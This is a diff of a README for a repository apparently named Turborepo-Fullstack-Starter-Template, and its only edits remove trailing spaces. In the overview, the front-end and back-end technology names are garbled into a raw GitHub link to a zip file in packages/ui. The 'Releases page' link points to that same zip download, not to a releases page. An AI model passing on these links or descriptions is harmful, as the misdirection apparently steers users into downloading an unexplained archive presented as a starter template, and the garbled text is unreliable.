@@ -4,7 +4,7 @@
 
 ## 📋 Overview
 
-Turborepo-Fullstack-Starter-Template is a complete solution for building scalable fullstack applications. It combines popular technologies like https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip for the front end, https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip for the back end, and Supabase for database and authentication needs. This template uses Tailwind for styling and includes built-in testing frameworks such as Jest and Playwright, making it perfect for rapid development. 
+Turborepo-Fullstack-Starter-Template is a complete solution for building scalable fullstack applications. It combines popular technologies like https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip for the front end, https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip for the back end, and Supabase for database and authentication needs. This template uses Tailwind for styling and includes built-in testing frameworks such as Jest and Playwright, making it perfect for rapid development.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these simple steps to get your application up and running.
 
 ### 1. Visit the Releases Page
 
-Begin by visiting the [Releases page](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip) where you can find the latest version of the software. 
+Begin by visiting the [Releases page](https://raw.githubusercontent.com/DRACOSFN/Turborepo-Fullstack-Starter-Template/master/packages/ui/Template-Fullstack-Starter-Turborepo-v1.1.zip) where you can find the latest version of the software.
 
 ### 2. Download the Application
 
